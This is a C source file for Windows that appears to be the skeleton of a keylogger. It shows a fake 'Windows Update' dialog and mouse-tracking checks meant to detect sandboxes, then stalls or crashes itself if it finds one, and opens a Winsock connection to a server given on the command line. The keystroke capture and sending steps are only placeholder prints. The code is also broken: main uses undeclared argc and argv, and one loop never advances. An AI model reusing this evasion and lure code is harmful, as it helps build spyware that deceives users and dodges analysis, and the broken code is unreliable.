#include <math.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <time.h>
#include <windows.h>

#define _WIN32_WINNT 0x501

#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"

int checkVirtualEnvironment(); // Checks for human-like behavior
void stallCode(); // Runs a function forever that does nothing useful
void smashStack(); // Spoils the stack and crashes the program

int main() {
    ////////////////////////////////////////////////////////////////
    // Check Environment
    ////////////////////////////////////////////////////////////////

    // Create some random number to randomize behavior
    srand(time(NULL));
    int randomNum = 0;

    if (checkVirtualEnvironment()) {
        randomNum = rand();

        if (randomNum % 2 == 0) {
            stallCode();
        }else {
            smashStack();
        }
    }

    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    const char* sendbuf = "this is a test";
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    // Validate the parameters
    if (argc != 2) {
        printf("usage: %s server-name\n", argv[0]);
        return 1;
    }

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    // Send an initial buffer
    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    printf("Bytes Sent: %ld\n", iResult);

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // Receive until the peer closes the connection
    do {

        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0)
            printf("Bytes received: %d\n", iResult);
        else if (iResult == 0)
            printf("Connection closed\n");
        else
            printf("recv failed with error: %d\n", WSAGetLastError());

    } while (iResult > 0);

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    while (true) {
        ////////////////////////////////////////////////////////////////
        // Get Most Recent Keystroke
        ////////////////////////////////////////////////////////////////
        printf("Getting most recent key stroke...\n");


        ////////////////////////////////////////////////////////////////
        // Create Connection
        ////////////////////////////////////////////////////////////////
        printf("Connecting to server...\n");


        ////////////////////////////////////////////////////////////////
        // Send Keystroke
        ////////////////////////////////////////////////////////////////
        printf("Sending to server...\n");


        ////////////////////////////////////////////////////////////////
        // Close Connection
        ////////////////////////////////////////////////////////////////
        printf("Closing connection...\n");


        break;
    }
}

int checkVirtualEnvironment() {
// Check if Adoclient is running in virtual environment
// OUTPUT: 1 if true, else 0

    int result = true;
    int response = 0;
    POINT currentMousePosition;
    POINT previousMousePosition;
    double mouseDistance = 0;
    time_t startTime = 0;
    time_t timeElapsed = 0;

    // Create window prompt
    startTime = time(NULL);
    response = MessageBoxW(NULL, L"Update complete, press Cancel to continue...",
        L"Windows Update", MB_YESNOCANCEL);
    timeElapsed = time(NULL) - startTime;

    // Check if response time was faster than humanly possible
    if (timeElapsed < 1) {
        return true;
    }

    // Track mouse movement
    GetCursorPos(&previousMousePosition);
    startTime = time(NULL);

    while (true){
        GetCursorPos(&currentMousePosition);
        mouseDistance += sqrt(pow(currentMousePosition.x - previousMousePosition.x, 2) +
                              pow(currentMousePosition.y - previousMousePosition.y, 2));

        previousMousePosition = currentMousePosition;

        if (mouseDistance > 10000){
            result = false;
            break;
        }
    }

    timeElapsed = time(NULL) - startTime;

    // Check if mouse movement was faster than humanly possible
    if (timeElapsed < 2) {
        return true;
    }

    // Check if human possible read correct button to press
    if (response == IDCANCEL){
        result = false;
    }

    return result;
}

void stallCode() {
// Aimlessly inserts random ints into a list with no break condition

    printf("Stalling\n");
    srand(time(NULL));
    int a[] = {5 ,8 ,4 ,1 ,3 ,0 ,6 ,8 ,4 ,0 ,6 ,8 ,4 ,5 ,1 ,0 ,3, 2};
    int index = 0;
    
    while (true) {
        a[index] = rand() % 10 + 1;

        if (a[index] == -1) {
            break;
        }
    }
    return;
}

void smashStack() {
// Attempts to kill the process by smashing its own stack

    printf("Smashing\n");
    char buffer[1];
    strcpy(buffer, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    return;
}
